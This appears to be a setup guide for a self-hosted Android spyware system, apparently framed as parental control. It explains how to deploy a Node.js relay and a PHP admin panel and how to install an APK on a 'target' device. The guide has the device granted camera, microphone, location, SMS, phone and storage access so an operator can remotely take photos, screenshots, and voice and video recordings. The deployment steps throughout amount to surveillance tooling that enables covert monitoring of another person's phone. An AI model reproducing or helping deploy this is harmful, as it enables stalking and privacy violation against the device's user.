# 🛠️ Setup Guide — Android Surveillance Hub

> **Architecture**: PHP host (login/UI) ↔ Browser JS ↔ Render.com Node.js (real-time Socket.IO + WebRTC)

---

## 📋 Requirements

| Component | Requirement |
|-----------|-------------|
| PHP Host  | Any shared hosting / VPS / cPanel with PHP 7.4+ |
| Node.js Server | Render.com free tier (or any VPS) |
| Android Device | Android 9+ (API 28+), camera + mic permissions |
| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ |
| Node.js (local dev) | v16+ |
| npm | v8+ |

---

## 🚀 Step-by-Step Setup

### Step 1 — Clone Repository

```bash
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git
cd WebRTC-Android-prentcontrol
```

---

### Step 2 — Deploy Node.js Server on Render

1. Go to [render.com](https://render.com) → **New Web Service**
2. Connect your GitHub repo
3. Set these settings:

| Setting | Value |
|---------|-------|
| Root Directory | `Android-WebRTC-Spyware-Server` |
| Build Command | `npm install` |
| Start Command | `node server.js` |
| Environment | `Node` |

4. After deploy, copy your Render URL: `https://YOUR-APP.onrender.com`

---

### Step 3 — Configure `config.js.php`

Open `Android-WebRTC-Spyware-Server/public/config.js.php` and set your Render URL:

```php
$RENDER_SERVER_URL = getenv('RENDER_SERVER_URL') ?: 'https://YOUR-APP.onrender.com';
```

**OR** set an environment variable on your PHP host:
```bash
export RENDER_SERVER_URL=https://YOUR-APP.onrender.com
```

---

### Step 4 — Configure CORS in `server.js`

Open `Android-WebRTC-Spyware-Server/server.js` and add your PHP host domain:

```js
const ALLOWED_ORIGINS = [
    'https://YOUR-PHP-DOMAIN.com',   // ← your PHP host
    'http://localhost',
    ...
];
```

---

### Step 5 — Upload PHP Panel to Your Host

Upload all files from `Android-WebRTC-Spyware-Server/public/` to your PHP host (cPanel/FTP):

```
public/
├── auth.php          ← session guard
├── login.php         ← admin login page
├── logout.php        ← session destroy
├── index.php         ← main dashboard (UPDATED)
└── config.js.php     ← outputs Render URL to JS (NEW)
```

> Default credentials are set in `auth.php`. Change them before deploying.

---

### Step 6 — Build & Install Android App

1. Open project in **Android Studio**
2. Open `app/src/main/java/.../StreamingService.java`
3. Set your Render server URL:
```java
private static final String SIGNALING_URL = "https://YOUR-APP.onrender.com";
```
4. Build → **Generate Signed APK** or run directly on device
5. Install APK on target Android device
6. Grant all permissions:
   - 📷 Camera
   - 🎤 Microphone
   - 📍 Location
   - 💬 SMS
   - 📞 Phone
   - 🔔 Notifications
   - 💾 Storage (for File Explorer)

---

### Step 7 — Open Admin Panel

```
https://YOUR-PHP-DOMAIN.com/
```

Login → Dashboard loads → Android device appears in sidebar automatically.

---

## 🎯 Capture & Record Features

The admin panel has a **Capture & Record** section with 4 actions:

| Button | What it does | Result |
|--------|-------------|--------|
| 📸 **Capture Photo** | Takes a still photo via Android camera | JPEG shown in gallery, downloadable |
| 🖥️ **Screenshot** | Captures current Android screen | PNG shown in gallery, downloadable |
| 🎙️ **Record Voice** | Starts mic recording; press again to stop | Audio player shown, downloadable |
| 🎥 **Record Video** | Starts camera recording; press again to stop | Video player shown, downloadable |

> **How it works**: The web panel sends a Socket.IO command to the Android device → Android captures/records → sends back base64 data → panel shows inline preview + download button.

> **Android-side**: You must implement the capture handlers in `StreamingService.java` listening for `capture:photo`, `capture:screenshot`, `record:voice:start/stop`, `record:video:start/stop` Socket.IO events and responding with `capture:photo:result`, etc.

---

## 🔗 How PHP + Node.js Connect

```
Your PHP Host (cPanel/VPS)              Render.com
┌──────────────────────────┐            ┌──────────────────────┐
│  login.php  ← auth       │            │  server.js           │
│  auth.php   ← sessions   │  Browser   │  Socket.IO           │
│  index.php  ← HTML page  │ ◄──JS──►  │  WebRTC signaling    │
│  config.js.php ← URL var │            │  Capture relay       │
└──────────────────────────┘            └──────────────────────┘
  PHP does LOGIN ONLY                     Node.js does ALL
                                          real-time work
```

1. `config.js.php` outputs `const RENDER_SERVER_URL = "https://..."` as JS
2. `index.php` loads `socket.io.js` **directly from Render URL**
3. Browser JS calls `io(RENDER_SERVER_URL, { withCredentials: false })`
4. All Socket.IO traffic goes directly: **Browser ↔ Render** (PHP never touches it)

---

## 🔧 Local Development

```bash
cd Android-WebRTC-Spyware-Server
npm install
node server.js
# Server runs at http://localhost:3000
```

For PHP locally, use XAMPP/Laragon and point `config.js.php` to `http://localhost:3000`.

---

## 🚨 Troubleshooting

| Problem | Fix |
|---------|-----|
| `❌ Cannot load Socket.IO from Render` | Check `config.js.php` URL, verify Render is running |
| `CORS blocked` error in console | Add your PHP domain to `ALLOWED_ORIGINS` in `server.js` |
| Android device not appearing | Check `SIGNALING_URL` in Android app matches your Render URL |
| Capture buttons do nothing | Android app must implement the capture Socket.IO events |
| Video/Audio not playing | Browser must be HTTPS for MediaStream/Blob URLs to work |
| `/socket.io/socket.io.js` 404 | Render server not running; check Render dashboard logs |

---

## 📦 Environment Variables (Render)

Set these in your Render service dashboard:

| Variable | Value |
|----------|-------|
| `PORT` | `3000` (auto-set by Render) |
| `NODE_ENV` | `production` |

---

*Built with Node.js · Socket.IO · WebRTC · PHP · Android*
